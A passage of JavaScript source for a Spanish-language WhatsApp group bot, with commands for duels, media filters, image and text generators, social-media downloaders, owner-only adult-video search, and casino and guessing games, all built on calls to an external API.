await mencionar(duelitoss, `⚔️𝐄𝐌𝐏𝐄𝐙𝐎 𝐄𝐋 𝐃𝐔𝐄𝐋𝐎⚔️\n@${nmr}  𝚅𝚂  @${nmr2}\n𝙳𝚄𝙴𝙻𝙾 𝙳𝙴:  ${pergunta}\n𝙳𝙸𝙶𝙸𝚃𝙴:  primero = Para Votar Por:  @${nmr}\n𝙳𝙸𝙶𝙸𝚃𝙴:  segundo = Para Votar Por:  @${nmr2}\n⚠️ 𝐀𝐓𝐄𝐍𝐂𝐈𝐎𝐍: 𝚂𝙾𝙻𝙾 𝙴𝚂 𝙿𝙾𝚂𝙸𝙱𝙻𝙴 𝚅𝙾𝚃𝙰𝚁 𝚄𝙽𝙰 𝚂𝙾𝙻𝙰 𝚅𝙴𝚉 , 𝙿𝙸𝙴𝙽𝚂𝙴 𝚈 𝙻𝚄𝙴𝙶𝙾 𝙰𝙲𝚃𝚄𝙴 . 𝙽𝙾 𝚂𝙴 𝙿𝚄𝙴𝙳𝙴 𝙰𝙻𝚃𝙴𝚁𝙰𝚁 𝙴𝙻 𝚅𝙾𝚃𝙾 𝙳𝙴𝚂𝙿𝚄𝙴𝚂`, [nmr+'@s.whatsapp.net', nmr2+'@s.whatsapp.net'], true)
addVotoDuelo(from , pergunta , nmr , nmr2 , tempo , enviar)
break
 case 'owner': case 'creador': case 'dueño': case 'creator': {
                const vcard =
				'BEGIN:VCARD\n' + 
				'VERSION:3.0\n' +
				`FN: Juls Modders\n` + 
				`ORG: Creador oficial del bot\n` + 
				`TEL;type=MSG;type=CELL;type=VOICE;waid=32460220392:+32460220392\n` + // WhatsApp ID + phone number
				'END:VCARD'
			sock.sendMessage(from, {
				contacts: {
					displayName: "Juls Modders",
					contacts: [{ vcard }],
				},
			}, { quoted: info})
               }
        break
 case 'styletext': case 'style':
 if(!q) return enviar(respuesta.textito)
 enviar(respuesta.espere)
 var ext = await fetchJson(`https://minijulscitoapi.store/api2/styletext?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
 var loj = [];
 	for(let i = 0; i < ext.length; i++) {
 	 loju = `${ext[i].result}\n`
 	 loj.push(loju)
 	}
 	loj += "";
 	try{
 	enviar(loj)
 	} catch {
 	enviar(respuesta.error)
 	}
break
case 'antisticker':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite antisticker 1 para activar o antisticker 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiSticker) return enviar('[❌️]Ya está activo')
antisticker.push(from)
fs.writeFileSync('./archivos/antis/antisticker.json', JSON.stringify(antisticker))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return enviar('[❌️]Ya está desactivado')
antisticker.splice(from, 1)
fs.writeFileSync('./archivos/antis/antisticker.json', JSON.stringify(antisticker))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite antisticker 1 para activar o antisticker 0 para desactivar`)
}
break
case 'antiimg': case 'antiimagen':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .antiimg 1 para activar o .antiimg 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiImg) return enviar('[❌️]Ya está activo')
antiimg.push(from)
fs.writeFileSync('./archivos/antis/antiimg.json', JSON.stringify(antiimg))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return enviar('[❌️]Ya está desactivado')
antiimg.splice(from, 1)
fs.writeFileSync('./archivos/antis/antiimg.json', JSON.stringify(antiimg))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antiimg 1 para activar o .antiimg 0 para desactivar`)
}
break
case 'antivideo': case 'antivid':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite antivideo 1 para activar o antivideo 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiVid) return enviar('[❌️]Ya está activo')
antivid.push(from)
fs.writeFileSync('./archivos/antis/antivideo.json', JSON.stringify(antivid))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return enviar('[❌️]Ya está desactivado')
antivid.splice(from, 1)
fs.writeFileSync('./archivos/antis/antivideo.json', JSON.stringify(antivid))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antivideo 1 para activar o .antivideo 0 para desactivar`)
}
break
case 'antiloc': case 'antilocalización': case 'antilocalizacion':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite antiloc 1 para activar o antiloc 0 para desactivar`)
if (Number(args[0]) === 1) {
if(Antiloc) return enviar('[❌️]Ya está activo')
antiloc.push(from)
fs.writeFileSync('./archivos/antis/antiloc.json', JSON.stringify(antiloc))
await enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if(!Antiloc) return enviar('[❌️]Ya está desactivado')
antiloc.splice(from, 1)
fs.writeFileSync('./archivos/antis/antiloc.json', JSON.stringify(antiloc))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite antiloc 1 para activar o antiloc 0 para desactivar`)
}
break
case 'anticontac': case 'anticontacto': case 'antictt':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .anticontac 1 para activar o .anticontac 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiCtt) return enviar('[❌️]Ya está activo')
antictt.push(from)
fs.writeFileSync('./archivos/antis/antictt.json', JSON.stringify(antictt))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiCtt) return enviar('[❌️]Ya está desactivado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./archivos/antis/antictt.json', JSON.stringify(antictt))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antiloc 1 para activar o .antiloc 0 para desactivar`)
}
break        
case 'antiaudio':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .antiaudio 1 para activar o .antiaudio 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiAudio) return enviar('[❌️]Ya está activo')
antiaudio.push(from)
fs.writeFileSync('./archivos/antis/antiaudio.json', JSON.stringify(antiaudio))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return enviar('[❌️]Ya está desactivado')
antiaudio.splice(from, 1)
fs.writeFileSync('./archivos/antis/antiaudio.json', JSON.stringify(antiaudio))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antiaudio 1 para activar o .antiaudio 0 para desactivar`)
}
break
case 'antinotas':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .antinotas 1 para activar o .antinotas 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntiNotas) return enviar('[❌️]Ya está activo')
antinotas.push(from)
fs.writeFileSync('./archivos/antis/antinotas.json', JSON.stringify(antinotas))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return enviar('[❌️]Ya está desactivado')
antinotas.splice(from, 1)
fs.writeFileSync('./archivos/antis/antinotas.json', JSON.stringify(antinotas))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antinotas 1 para activar o .antinotas 0 para desactivar`)
}
break
case 'autoread': case 'autoreac': case 'autoreact':
if(!isGroup) return enviar(respuesta.grupos)
if(!isGroupAdmins) return enviar(respuesta.admin)
if (Number(args[0]) === 1) {
if (isAutoReact) return enviar('⛔️ Yá está activado')
autoreact.push(from)
fs.writeFileSync('./archivos/antis/autoreact.json', JSON.stringify(autoreact))
enviar('[✅️] *Autoreac Activado*')
} else if (Number(args[0]) === 0) {
if (!isAutoReact) return enviar('⛔️ Yá está desactivado')
pesquisar = from
processo = autoreact.indexOf(pesquisar)
while(processo >= 0){
autoreact.splice(processo, 1)
processo = autoreact.indexOf(pesquisar)
}
fs.writeFileSync('./archivos/antis/autoreact.json', JSON.stringify(autoreact))
enviar('[❌️] *Autoreac Desactivado*')
} else {
enviar('⛔️ Digite .autoreac 1 para activar o .autoreac 0 para desactivar')
}
break
case 'autofig-gp': case 'autofig': case 'autostick': case 'autosticker': case 'autostickers':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .autostick 1 para activar o .autostick 0 para desactivar`)
if (args[0]  === '1'){
if (isAutoSticker) return enviar('[❌️]Ya está activo')
autosticker.push(from)
fs.writeFileSync('./archivos/antis/autosticker.json', JSON.stringify(autosticker))
enviar('[✅️] Activado' )
} else if (args[0] === '0'){
if (!isAutoSticker) return enviar('[❌️]Ya está desactivado')
 anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./archivos/antis/autosticker.json', JSON.stringify(autosticker))
enviar('[✅️] Desactivado' )
}
break
case 'buscarstickers': case 'buscarsticker':
if(!q) return enviar(respuesta.textito)
var jul = await fetchJson(`https://minijulscitoapi.store/brincadeira/stickers1?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
enviar(respuesta.espere)
try{
var buu = []
for(let u = 0 ; u < jul.length ; u++) {
var loku = jul[u].url
var use = `[🍿] Aquí tiene el link del paquete : ${loku}.\npara descargarlo use : linkstick\n\n`;
buu.push(use)
}
buu += ""
enviar(buu)
} catch {
enviar(respuesta.error)
}
break
case 'linkstick':
if(!q) return enviar(respuesta.linkii)
var jul = await fetchJson(`https://minijulscitoapi.store/brincadeira/urlstick?link=${encodeURIComponent(q)}&apikey=Vipppp`)
enviar(respuesta.espere)
try{
for(let ju = 0 ; ju < jul.length ; ju++) {
var juld = jul[ju].result_link;
var kon = await getBuffer(juld);
await enviarfiguimg(from, kon, info, {
 packname: `${pushname}`, author: `${author}`
})
}
} catch {
enviar(respuesta.error)
}
break
case 'xxx':
     if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!q) return enviar(respuesta.textito)
     if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
var jul = await fetchJson(`https://minijulscitoapi.store/danger/xxx?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
var zoo = []
for (let uu = 0; uu < jul.result.length ; uu++) {
var fin = `
[🍿] *Titulo* : ${jul.result[uu].title}\n
[🌍] *link* : ${jul.result[uu].link}\n
Para descargarlo use lkxxx
`
zoo.push(fin)
}
zoo += ""
try{
enviar(zoo)
} catch {
enviar(respuesta.error)
}
break
case 'linkxxx': case 'lkxxx':
if(!q) return enviar(respuesta.textito)
     if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
var jul = await fetchJson(`https://minijulscitoapi.store/danger/xxx2?link=${encodeURIComponent(q)}&apikey=Vipppp`)
enviar(respuesta.espere)
try{
sock.sendMessage(from,{ video : { url : jul.result.files.low}, caption : respuesta.pedido}, { quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'xvideos': case 'xvid':
     if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
     if(!q) return enviar(respuesta.textito)
     enviar(respuesta.espere)
     var jux = await fetchJson(`https://minijulscitoapi.store/api3/xvideos?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
var puu = []
for(let ux = 0; ux < jux.result.length ; ux++) {
var up = `
[🍿] *Titulo* : ${jux.result[ux].title}
[🌍] *Link* : ${jux.result[ux].url}\n
Para descargarlo digite lkxvid
`
puu.push(up)
}
puu += ""
try{
enviar(puu)
} catch {
enviar(respuesta.error)
}
break     
case 'lkxvid':
     if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
     if(!q) return enviar(respuesta.linkii)
     enviar(respuesta.espere)
     var puu = await fetchJson(`https://minijulscitoapi.store/api3/xvideos2?link=${encodeURIComponent(q)}&apikey=Vipppp`)
     try{
  sock.sendMessage(from,{ video : { url : puu.result.url},caption: respuesta.pedido},{ quoted : info}) 
     } catch {
     enviar(respuesta.error)
     }
break
case'blackpink': case'aleatory': case'avatar': case'avatar2': case'avatar3': case'francotirador': case'francotirador2': case'francotirador3': case'francotirador4': case'francotirador5': case'francotirador6': case'francotirador7': case'banner2': case'banner3': case'banner4': case'banner5': case'banner6': case'banner7': case'counterstrick': case'counterstrick2': case'counterstrick3': case'counterstrick4': case'counterstrick5': case'counterstrick6': case'counterstrick7': case'narutowall': case'cumpleaños': case'harrypotter': case'pokemones6': case'pokemones5': case'pokemones4': case'pokemones3': case'pokemones2': case'pokemones':                     
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
var juu = await getBuffer(`https://minijulscitoapi.store/photo/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
try{
enviarfoto(juu,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
case'garena': case'battle':
if (args.length === 0) return enviar(`𝚄𝚂𝙴𝙻𝙾 𝙳𝙴 𝙻𝙰 𝚂𝙸𝙶𝚄𝙸𝙴𝙽𝚃𝙴 𝙼𝙰𝙽𝙴𝚁𝙰 :\n${comando} juls / modders`)
txt = args.join(' ')
texto1 = txt.split('/')[0] || 'Indefinido'
texto2 = txt.split('/')[1] || 'Indefinido'
enviar(respuesta.espere)
var gar = await getBuffer(`https://minijulscitoapi.store/photo/${comando}?texto=${encodeURIComponent(texto1)}&texto2=${encodeURIComponent(texto2)}&apikey=Vipppp`)
try{
enviarfoto(gar,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
 case'hellowkiti': case'pentakil': case'grafiti': case'cementerio': case'lobo': case'gradient': case'metallic': case'neon3': case'mar': case'cereal': case'plantilla': case'grass': case'orange': case'cromed': case'vela': case'arcade': case'shine': case'neon2': case'neon': case'sandia': case'yellow': case'arcoiris': case'brillo': case'fuego': case'green': case'jungla': case'madera': case'flores': case'blackpink': case'corazones': case'caffe': case'caffe2':
 if(!q) return enviar(respuesta.textito)
 enviar(respuesta.espere)
 var jul = await getBuffer(`https://minijulscitoapi.store/photo/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`) 
try{
enviarfoto(jul,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
    case'bokeh': case'greenn': case'impressive': case'liglig': case'summerr': case'summer2': case'matrix': case'thunder': case'alas': case'styleg': case'violeta': case'wolf': case'pinkl': case'electro': case'party': case'pinkcute': case'greenn': case'game': case'magma': case'koi': case'dropwater': case'blackpink2': case'halloween': case'batman': case'blood': case'narutolog': case'cage': 
    if(!q) return enviar(respuesta.textito)
var juks = await getBuffer(`https://minijulscitoapi.store/textpro/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`) 
try{
enviarfoto(juks,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
       case'pornhubl': case'leon': case'avengers': case'hallowean2': 
       if (args.length === 0) return enviar(`𝚄𝚂𝙴𝙻𝙾 𝙳𝙴 𝙻𝙰 𝚂𝙸𝙶𝚄𝙸𝙴𝙽𝚃𝙴 𝙼𝙰𝙽𝙴𝚁𝙰 :\n${comando} juls / modders`)
txt = args.join(' ')
texto1 = txt.split('/')[0] || 'Indefinido'
texto2 = txt.split('/')[1] || 'Indefinido'
enviar(respuesta.espere)       
var jul = await getBuffer(`https://minijulscitoapi.store/textpro/${comando}?texto=${encodeURIComponent(texto1)}&texto2=${encodeURIComponent(texto2)}&apikey=Vipppp`)
try{
enviarfoto(jul,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
case'natural': case'pencil': case'verdee': case'horror': case'artistic': case'realistic': case'pokemonl': case'coolst': case'joker': case'americaw': case'cobblestone': case'globos': case'burger': case'toxic': case'slime': case'glasss': case'huesos': case'decorative': case'lava': 
    if(!q) return enviar(respuesta.textito)
var juks = await getBuffer(`https://minijulscitoapi.store/textpro/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`) 
try{
enviarfoto(juks,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
case 'tiktokmusic': 
if(!q) return enviar(respuesta.linkii)
enviar(respuesta.espere)
var alison = await fetchJson(`https://minijulscitoapi.store/api3/tiktok?link=${q}&apikey=Vipppp`)
try{
sock.sendMessage(from,{ audio : { url : alison.result.data.wmplay },mimetype: 'audio/mpeg'},{ quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'tiktok': case 'tkt':
if(!q) return enviar(respuesta.linkii)
enviar(respuesta.espere)
var alison = await fetchJson(`https://api.akuari.my.id/downloader/tiktok4?link=${q}`)
try{
sock.sendMessage(from,{video : {url : alison.respon.download.nowm}, caption : respuesta.pedido},{ quoted : info})
} catch {
sock.sendMessage(from,{ video : { url : alison.respon.download.wm}, caption : respuesta.pedido},{ quoted : info})
}
break
case 'ig': case 'instagram':
if(!q) return enviar(respuesta.linkii)
enviar(respuesta.espere)
var kiu = await fetchJson(`https://api.akuari.my.id/downloader/igdl?link=${q}`)
try{
sock.sendMessage(from,{video : {url : kiu.respon[0].url}, caption : respuesta.pedido},{ quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'mediafire': case 'mediafirelink':
if(!isGroup) return enviar(respuesta.grupos)
if(!q) return enviar(respuesta.linkii)
if (!isUrl(q) || !q.includes('mediafire.com')) return enviar(`[❌️] Link inválido!`)
mfdw = await fetchJson(`https://minijulscitoapi.store/download/mediafire?url=${args[0]}&apikey=Vipppp`)
if (mfdw[0].peso.split('MB')[0] >= 250) return enviar('[❌️] *Archivo Muy pesado* ')
enviar(respuesta.espere)
try {
sock.sendMessage(from, {document: {url: mfdw[0].link}, fileName: mfdw[0].nome, mimetype: mfdw[0].tipo, mentions: [sender]}, {quoted: info})
} catch (err) {
enviar(respuesta.error)
}
break
case 'consejos': case 'consejo':
var kii = await fetchJson(`https://minijulscitoapi.store/brincadeira/consejos?apikey=Vipppp`)
enviar(kii.consejo)
break

case 'chiste': case 'chistes':
var kii = await fetchJson(`https://minijulscitoapi.store/brincadeira/chistes?apikey=Vipppp`)
enviar(kii.chiste)
break
case 'piropo': case 'piropos':
var kii = await fetchJson(`https://minijulscitoapi.store/brincadeira/piropos?apikey=Vipppp`)
enviar(kii.Piropo)
break
case "casino":
if(!isGroup) return enviar(respuesta.grupos)   
if(!isGroup) return enviar(respuesta.grupos)
if(q =="facil") {
const somtoy22 = casinofacil[Math.floor(Math.random() * casinofacil.length)]
if ((somtoy22 == '🥑 : 🥑 : 🥑') ||(somtoy22 == '🍉 : 🍉 : 🍉') ||(somtoy22 == '🍓 : 🍓 : 🍓') ||(somtoy22 == '🍎 : 🍎 : 🍎') ||(somtoy22 == '🍍 : 🍍 : 🍍') ||(somtoy22 == '🥝 : 🥝 : 🥝') ||(somtoy22 == '🍑 : 🍑 : 🍑') ||(somtoy22 == '🥥 : 🥥 : 🥥') ||(somtoy22 == '🍋 : 🍋 : 🍋') ||(somtoy22 == '👑  : ?? : 👑 ') ||(somtoy22 == '🍌 : 🍌 : 🍌') ||(somtoy22 == '👑 : 👑 : 👑') ||(somtoy22 == '🔔 : 🔔 : 🔔') ||(somtoy22 == '🍊 : 🍊 : 🍊') ||(somtoy22 == '🍇 : 🍇 : 🍇')) {
var Vitória = `Gano ${pushname}`
} else {
var Vitória = `Perdio ${pushname}`
}
const casinodif =
`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗡𝗜𝗩𝗘𝗟 :  Dificil
╿║ ➪ 𝗝𝗨𝗚𝗔𝗗𝗔 : ${somtoy22}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : ${Vitória}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍

`
enviar(casinodif)
} else if(q == "dificil") {
const somtoy2 = casinodificil[Math.floor(Math.random() * casinodificil.length)]
if ((somtoy2 == '🥑 : 🥑 : 🥑') ||(somtoy2 == ' 🍉: 🍉 : 🍉') ||(somtoy2 == '🍓 : 🍓 : 🍓') ||(somtoy2 == '🍎 : 🍎 : 🍎') ||(somtoy2 == '🍍 : 🍍 : 🍍') ||(somtoy2 == '🥝 : 🥝 : 🥝') ||(somtoy2 == '🍑 : 🍑 : 🍑') ||(somtoy2 == '🥥 : 🥥 : 🥥') ||(somtoy2 == '🍋 : 🍋 : 🍋') ||(somtoy2 == '👑  : 👑  : 👑 ') ||(somtoy2 == '🍌 : 🍌 : 🍌') ||(somtoy2 == '👑 : 👑 : 👑') ||(somtoy2 == '🔔 : 🔔 : 🔔') ||(somtoy2 == '🍊 : 🍊 : 🍊') ||(somtoy2 == ' 🍇 : 🍇 : 🍇')) {
var Vitória = `Gano ${pushname}`
} else {
var Vitória = `Perdio ${pushname}`
}
const chiquilla =
`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗡𝗜𝗩𝗘𝗟 :  Dificil
╿║ ➪ 𝗝𝗨𝗚𝗔𝗗𝗔 : ${somtoy2}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : ${Vitória}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(chiquilla)
} else {
enviar("[⛔️] *Digite casino facil o casino dificil , elija el nivel que más desee* ")
}
break
case "mundoz":
if(!isGroup) return enviar(respuesta.grupos)
let animequiz = Math.floor(Math.random() * mundoZ.length)
if(q =="on") {       
if(fs.existsSync(`./archivos/juegos/mundoZ-${from}.json`)) {
let dataDos = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoZ-${from}.json`))
textoAdiviname =` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\nAnimos tú puedes`
wew = await getBuffer(dataDos.foto)   
await sock.sendMessage(from,{image : wew,caption : textoAdiviname},{quoted: info})
} else {   
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : mundoz on`)
fs.writeFileSync(`./archivos/juegos/mundoZ-${from}.json`, `${JSON.stringify(mundoZ[animequiz])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/mundoZ-${from}.json`)) return enviar('⛔️ 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/mundoZ-${from}.json`)
enviar("⛔️ 𝐌𝐔𝐍𝐃𝐎 𝐙 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
      
var dataDos = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoZ-${from}.json`))
wew = await getBuffer(dataDos.foto)
const respiuiii = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${dataDos.original}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`   

await sock.sendMessage(from,{image : wew,caption : respiuiii},{quoted: info})
} else {
fs.writeFileSync(`./archivos/juegos/mundoZ-${from}.json`, `${JSON.stringify(mundoZ[animequiz])}`)
enviar("⛔️ *Digite .mundoz on Para empezar a Jugar, .mundoz off Para apagarlo y .mundoz revelar para hacer trampa* ")
}
break

case "banderas":
if(!isGroup) return enviar(respuesta.grupos)
let banderaquiz = Math.floor(Math.random() * banderasok.length)
if(q =="on") {
  
if(fs.existsSync(`./archivos/juegos/banderasok-${from}.json`)) {
let dataBan = JSON.parse(fs.readFileSync(`./archivos/juegos/banderasok-${from}.json`))
const banDd =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗕𝗔𝗡𝗗𝗘𝗥𝗔 : ${dataBan.bandera}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(banDd)
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : banderas on`)
fs.writeFileSync(`./archivos/juegos/banderasok-${from}.json`, `${JSON.stringify(banderasok[banderaquiz])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/banderasok-${from}.json`)) return enviar('⛔️ 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/banderasok-${from}.json`)
enviar("⛔️ 𝐀𝐃𝐈𝐕𝐈𝐍𝐀 𝐋𝐀 𝐁𝐀𝐍𝐃𝐄𝐑𝐀 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
  
var dataBan = JSON.parse(fs.readFileSync(`./archivos/juegos/banderasok-${from}.json`))
const textiP =    `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${dataBan.respuesta}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(textiP)
} else {
fs.writeFileSync(`./archivos/juegos/banderasok-${from}.json`, `${JSON.stringify(banderasok[banderaquiz])}`)
enviar("⛔️ *Digite .banderas on Para empezar a Jugar, .banderas off Para apagarlo y .banderas revelar para hacer trampa* ")
}
break

case "dragonz":
if(!isGroup) return enviar(respuesta.grupos)
let dragoncito = Math.floor(Math.random() * dragonz.length)
if(q =="on") {
  
if(fs.existsSync(`./archivos/juegos/dragonz-${from}.json`)) {
let dragon2 = JSON.parse(fs.readFileSync(`./archivos/juegos/dragonz-${from}.json`))
textoDragon = ` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
dragon3 = await getBuffer(dragon2.foto)   
await sock.sendMessage(from,{image : dragon3,caption : textoDragon},{quoted: info})
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : dragonz on`)
fs.writeFileSync(`./archivos/juegos/dragonz-${from}.json`, `${JSON.stringify(dragonz[dragoncito])}`)
}
} else if(q == "off") {
